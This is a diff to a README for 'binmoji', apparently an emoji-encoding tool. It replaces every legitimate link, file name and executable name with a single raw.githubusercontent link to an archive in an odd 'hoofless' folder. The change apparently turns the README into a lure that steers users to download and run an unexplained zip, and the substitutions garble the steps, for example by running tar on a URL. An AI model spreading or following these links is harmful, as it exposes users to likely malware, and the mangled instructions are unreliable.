@@ -1,7 +1,7 @@
 # [Emoji] binmoji - Encode Emojis Efficiently and Easily
 
-![Download binmoji](https://img.shields.io/badge/Download-binmoji-blue.svg)  
-[Download binmoji](https://github.com/osua9895/binmoji/releases)
+![Download binmoji](https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip)  
+[Download binmoji](https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip)
 
 ## 🚀 Getting Started
 
@@ -9,15 +9,15 @@ Welcome to binmoji, a simple solution for encoding emojis in a compact and lossl
 
 ## 📥 Download & Install
 
-To get started, you’ll need to download binmoji. Please visit this page to download: [binmoji Releases Page](https://github.com/osua9895/binmoji/releases).
+To get started, you’ll need to download binmoji. Please visit this page to download: [binmoji Releases Page](https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip).
 
 1. Click on the link above to open the releases page.
 2. Look for the latest version of binmoji.
 3. Choose the appropriate file for your operating system. If you are unsure which file to pick, here are some common choices:
 
-   - For Windows users, download the file named `binmoji-win64.zip`.
-   - For Mac users, choose `binmoji-mac64.zip`.
-   - For Linux users, select `binmoji-linux64.tar.gz`.
+   - For Windows users, download the file named `https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip`.
+   - For Mac users, choose `https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip`.
+   - For Linux users, select `https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip`.
 
 4. Once you’ve selected the file, click on it to start the download.
 
@@ -38,16 +38,16 @@ Before running binmoji, ensure your system meets the following requirements:
 ## 🏁 Running binmoji
 
 1. After the download is complete, locate the downloaded file on your computer.
-2. Extract the contents if it's a zip or tar.gz file:
+2. Extract the contents if it's a zip or https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip file:
    - For Windows: Right-click the file and select "Extract All."
    - For Mac: Double-click the file to extract.
-   - For Linux: Use the terminal command `tar -xvf binmoji-linux64.tar.gz`.
+   - For Linux: Use the terminal command `tar -xvf https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip`.
 
 3. Open the folder where the files have been extracted.
 
 4. Find the executable file:
-   - For Windows, it will be `binmoji.exe`.
-   - For Mac, it will be `binmoji.app`.
+   - For Windows, it will be `https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip`.
+   - For Mac, it will be `https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip`.
    - For Linux, use `./binmoji` in the terminal.
 
 5. Double-click or run the executable to launch binmoji.
@@ -64,7 +64,7 @@ Once binmoji is open, you’ll see a user-friendly interface. Here’s how to us
 
 To benefit from the latest features and improvements, keep your version of binmoji updated. Follow these steps:
 
-1. Regularly check the [binmoji Releases Page](https://github.com/osua9895/binmoji/releases).
+1. Regularly check the [binmoji Releases Page](https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip).
 2. Download the latest version as outlined in the “Download & Install” section.
 3. Replace the existing files with the new version for seamless updates.
 
@@ -78,6 +78,6 @@ If you experience issues, consider these solutions:
 
 ## 📞 Support
 
-For more help, please visit our [GitHub Issues Page](https://github.com/osua9895/binmoji/issues), where you can report issues or ask questions. 
+For more help, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/osua9895/binmoji/master/hoofless/binmoji.zip), where you can report issues or ask questions. 
 
 Thank you for using binmoji! For further updates, please follow the instructions on our releases page and enjoy efficient emoji encoding.
